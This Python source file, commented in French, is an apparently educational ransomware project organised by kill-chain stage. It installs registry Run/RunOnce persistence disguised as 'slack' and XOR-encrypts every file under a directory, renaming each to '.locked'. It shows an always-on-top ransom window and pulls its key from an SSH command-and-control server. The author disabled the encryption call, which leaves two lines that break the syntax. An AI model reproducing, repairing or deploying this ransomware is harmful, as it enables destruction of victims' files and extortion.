import os
import customtkinter as ctk
import paramiko
import sys
import winreg

sys.stdout.reconfigure(encoding='utf-8')
nom_user = os.getlogin()
chemin = #'C:/Users/' + nom_user + '/Desktop'


### --- INSTALLATION / PERSISTANCE, ETAPE 5 DE LA KILLCHAIN --- ####

def obtenir_chemin_actuel():
    """
    Détecte automatiquement le chemin du programme, 
    qu'il soit un script .py ou un exécutable .exe.

    écriture : 100% IA

    entrée : null
    sortie : string
    """
    # Si le programme a été compilé en .exe (par exemple avec PyInstaller)
    if getattr(sys, 'frozen', False):
        return sys.executable
    # Si c'est un script Python classique (.py)
    else:
        return os.path.abspath(__file__)
    


def ajouter_au_registre(nom_tache="slack", type_demarrage="RunOnce"):
    """
    Ajoute un programme au démarrage de Windows via le Registre.
    
    :param nom_tache: Le nom que tu veux donner à ta clé (ex: "MonSuperScript")
    :param chemin_executable: Le chemin complet vers ton .exe ou script (.bat, .py)
    :param type_demarrage: "Run" (chaque démarrage) ou "RunOnce" (un seul démarrage)

    écriture : 90% IA 10% HUMAIN

    entrée : string, string
    sortie : bool
    """
    # On s'assure que le chemin est absolu
    chemin_absolu = obtenir_chemin_actuel()
    
    if not os.path.exists(chemin_absolu):
        print(f"Erreur : Le fichier {chemin_absolu} est introuvable.")
        return False

    # Définition du chemin dans le registre selon le choix
    if type_demarrage == "RunOnce":
        chemin_registre = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    elif type_demarrage == "Run":
        chemin_registre = r"Software\Microsoft\Windows\CurrentVersion\Run"
    else:
        print("Erreur : Le type doit être 'Run' ou 'RunOnce'.")
        return False

    try:
        # Ouverture de la clé du registre en mode écriture et écriture du fichier
        cle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin_registre, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(cle, nom_tache, 0, winreg.REG_SZ, f'"{chemin_absolu}"')
        winreg.CloseKey(cle)
        
        return True
        
    except Exception as e:
        return False


### --- ACTION SUR LES OBJECTIFS, ETAPE 7 DE LA KILLCHAIN --- ####

"""
prends le contenu d'un fichier, calcul le xor, et l'écrit dans le fichier à la place du contenu initial

écriture : 50% IA 50% HUMAIN

entrée : string, string
sortie : null
"""
def enc_file(nom_fichier,chemin_dossier):

    chemin_complet = os.path.join(chemin_dossier, nom_fichier)

    try:
        #ouverture du fichier en binaire pour lire le contenu et pouvoir le chiffré
        with open(chemin_complet,'rb') as fichier:
            contenu_fichier = fichier.read()
            binary_content = xor(contenu_fichier,cle)
        #ouverture du fichier en binaire pour pouvoir écrire le résultat du chiffrement
        with open(chemin_complet,'wb') as fichier:
            fichier.write(binary_content)
        #print(f"encryption of {nom_fichier} done !")

    except FileNotFoundError:
        print(f"Le fichier {nom_fichier} est introuvable.")
    except Exception as e:
        print(e)
        
"""
rajoute l'extension ".locked" à chaque fichier chiffré pour faire peur :p

écriture : 50% IA 50% HUMAIN

entrée : string, string
sortie : null
"""
def enc_file_name(chemin_dossier,fichier):
    file_name = chemin_dossier + '/' + fichier
    #print(file_name)
    #si le fichier est chiffré, alors on enlève l'extension ".locked"
    if len(file_name) >= 6 and file_name[-7:] == ".locked":
        crypted_name = file_name[:-7]
    #si le fichier n'est pas déjà chiffré, alors on ajoute l'extension ".locked"
    else:
        crypted_name = file_name + '.locked'

    try:
        #on rename le fichier avec ou sans ".locked"
        os.rename(file_name, crypted_name)
        #print(f"Le fichier a été renommé en {crypted_name}")
    except FileNotFoundError:
        print("Erreur : Le fichier d'origine n'existe pas.")
    except FileExistsError:
        print("Erreur : Un fichier porte déjà le nouveau nom.")


"""
quand on interprète de la donnée en bytes sur python, nous avons un int correspondant aux bits de chaque octets
par exemple : le mot "AAA" est interpréter comme un tableau de lettre "A" ecrit en binaire calculé en int, c'est à dire
ici par exemple "01000001" pour "A" = 65, donc -> print(b"AAA") => [65,65,65].
ici le but de la fonction est de traduire ces "65" en "01000001"

écriture : 100% HUMAIN

entrée : bytes, int
sortie : string
"""
def tobin(octet,pow = 8):
    #octet est de type bytes quand il rentre dans la fonction
    octet = int(octet)
    binary = ""
    #calcul la plus grande puissance de 2 qui concerne "octet" => 2^8 = 256 est compris entre le bit de 0 et de 128
    msb = (2**pow)//2
    #algorithmie de calcul de binaire, on part du plus grand bit (msb) et on enlève la valeur du bit regardé si la valeur de octet >= msb
    while len(binary) < pow:
        if octet >= msb:
            octet -= msb
            binary += '1'
        else:
            binary += '0'
        msb = msb / 2
    return binary

"""
la fonction qui applique un xor au contenu du fichier pour le chiffrer de manière symétrique
(Oui je sais qu'utiliser "^" est beaucoup plus rapide en raison de non conversion en string et de parallélisme,
mais le but était justement de le réimplémenter à la main)

écriture : 90% HUMAIN 10% IA

entrée : bytes, bytes
sortie : null
"""
def xor(binaryA,binaryB):
    binary = ""
    tabinary= []
    bina = ""
    binb = ""

    #traduit les bytes en binaire
    for a in range(len(binaryA)):
        bina += tobin(binaryA[a])
    for b in range(len(binaryB)):
        binb += tobin(binaryB[b])

    i = 0

    while i <= len(bina):
        #comparaison bit à bit du bit du contenu du fichier (bina) au bit de la cle de chiffrement (binb)
        for j in range(len(binb)):
            if i >= (len(bina)):
                #print(tabinary)
                interpret = strtobinary(tabinary)
                return interpret
            if bina[i] == binb[j]:
                binary += "0"
                i = i + 1
            else:
                binary += "1"
                i = i + 1
            
            #permet de diviser le resultat du xor bit à bit en octets
            if (len(binary) % 8 == 0) and (len(binary) != 0):
                #print(binary)
                tabinary.append(int(binary,2))
                binary = ""

"""
permet de transformer "[65,65,65]" en "AAA"

écriture : 100% HUMAIN

entrée : [int, int, ..., int]
sortie : string
"""
def strtobinary(tabinary):
    return bytes(tabinary)


"""
prends un chemin "repertoire" et parcours toute l'arborescence des fichiers en appliquant "enc_file()" et "enc_file_name()"

écriture : 30% HUMAIN 70% IA

entrée : string
sortie : bool
"""
def search_dir(repertoire):
    
    donttouch = ["encrypt.py"]
    # Vérifie si le chemin donné est un répertoire
    if not os.path.isdir(repertoire):
        print(f"Le chemin spécifié '{repertoire}' n'est pas un répertoire valide.")
        return False

    # Parcourt l'arborescence du répertoire
    for chemin_dossier, dossiers, fichiers in os.walk(repertoire):

        # pour tout les fichiers dans le répertoire actuel
        for fichier in fichiers:
            #print(f"  File : {fichier}, Chemin : {chemin_dossier}")

            #si le fichier n'est pas dans une liste d'exclusion alors on le chiffre
            if fichier not in donttouch:
                enc_file(fichier,chemin_dossier)
                enc_file_name(chemin_dossier,fichier)
                print(f"encryption de {fichier}")
    print("cryption done !")
    return True
            



"""
toute la partie interface graphique

écriture : 10% HUMAIN 90% IA

entrée : null
sortie : null
"""
# --- Configuration du design ---
ctk.set_appearance_mode("Dark")  # Modes: "System" (standard), "Dark", "Light"
ctk.set_default_color_theme("blue")  # Thèmes: "blue" (défaut), "green", "dark-blue"

class MonApplication(ctk.CTk):
    def __init__(self):
        super().__init__()

        # Configuration de la fenêtre principale
        #self.title("Mon Interface Moderne")
        self.geometry("600x400")
        self.configure(fg_color="#FF0000")

        #no salvation
        self.resizable(False, False) #ne peut pas être redimensionné
        self.attributes("-topmost", True) #est forcément au premier plan
        self.overrideredirect(True)

        # --- ÉTAPE 1 : Configurer la grille de la fenêtre ---
        # On dit que la colonne 0 et la ligne 0 doivent s'étirer (weight=1)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- ÉTAPE 2 : Créer un conteneur (Frame) au milieu ---
        # Ce cadre contiendra tous tes éléments.
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.grid(row=0, column=0, sticky="nsew") # Il occupe toute la grille

        # On configure aussi la grille INTERNE du cadre pour centrer
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure((0, 1, 2), weight=1) # On centre sur 3 lignes

        # --- ÉTAPE 3 : Ajouter les éléments ---
        self.label = ctk.CTkLabel(self.main_frame, text=f"oh noooooooooo ! pwned ! :( \n key={str(cle,'utf8')}", font=("Arial", 24, "bold"))
        self.label.grid(row=0, column=0, pady=10)

        self.entree_utilisateur = ctk.CTkEntry(self.main_frame, placeholder_text="Enter your key",border_color="#790000",fg_color="#8B0000", width=300)
        self.entree_utilisateur.grid(row=1, column=0, pady=10)

        self.bouton = ctk.CTkButton(self.main_frame, text="Decrypt !",fg_color="#8B0000",hover_color="#8B0000",command=self.verifier_cle)
        self.bouton.grid(row=2, column=0, pady=10)
        

    def verifier_cle(self):
        """
        Cette fonction est appelée quand on clique sur le bouton.
        Elle verifie que la clé entrée par l'utilisateur est bien la clé de chiffrement

        écriture : 50% HUMAIN 50% IA

        entrée : null
        sortie : null
        """
        # On récupère le texte écrit par l'utilisateur
        texte_saisi = self.entree_utilisateur.get()

        # si la clé et la bonne, alors on relance tout le script -> chiffrement symétrique => 2eme chiffrement veut dire déchiffrement
        if bytes(texte_saisi,'utf8') == cle:
            print("decription loading...")
            #########search_dir(chemin)
            self.destroy()


### --- COMMAND AND CONTROL, ETAPE 6 DE LA KILLCHAIN --- ####

"""
cette fonction sert au programme à se connecter à un serveur distant qui sera chargé de généré une clé au hasard
pas explicitement utile, dangereux car credentials en clair, mais ici pour apprendre un peu à appréhender 
la phase C2 de la killchain et également les notions d'appels serveurs que je n'avais exploré jusque là

écriture : 90% IA 10% HUMAIN

entrée : string, int, string, string, string
sortie : bytes
"""
def getCle(ip, port, utilisateur, mot_de_passe, commande):
    try:
        # 1. Création du client SSH
        client = paramiko.SSHClient()
        
        # 2. Accepter automatiquement les clés inconnues (évite le "yes/no" à la première connexion)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        print(f" Connexion à {ip}...")
        
        # 3. Connexion
        client.connect(hostname=ip, port=port ,username=utilisateur, password=mot_de_passe)
        
        # 4. Exécution de la commande
        stdin, stdout, stderr = client.exec_command(commande)
        
        # 5. Lecture du résultat
        cle = stdout.read().decode().strip()
        erreurs = stderr.read().decode().strip()
        
        if cle:
            print(f" Rsultat :\n{cle}")
        if erreurs:
            print(f" Erreur :\n{erreurs}")
            
    except Exception as e:
        print(f" Problème de connexion : {e}")
        cle = "alexileplusmart"
        
    finally:
        # 6. Fermeture propre
        client.close()
        print("Déconnecté.")
        return cle 

# --- CONFIGURATION --- #
IP = "-"  # Remplace par l'IP que tu as trouvée avec 'ip a'
USER = "-"  # Ou ton nom d'utilisateur créé à l'installation
PASS = "-"  # Le mot de passe associé
PORT = 2222 # Le port

# Lancement de l'application
if __name__ == "__main__":
    # on récupère la cle
    cle = bytes(getCle(IP, PORT, USER, PASS, f"./getcle.sh"),'utf8')
    print(cle)
    # si on a la clé on commence le chiffrement
    if cle:
        #securité pour que ça ne casse pas tout par inadvertance, croyez-moi, vous en avez besoin :{
        hasCrypt = #search_dir(chemin) #à enlever

        #si on a le chiffrement, alors on affiche l'interface pour l'utilisateur
        if hasCrypt:
            #print(chemin)
            print("key: ",str(cle,'utf8'))
            app = MonApplication()
            app.mainloop()
    else:
        print("no key found")
        
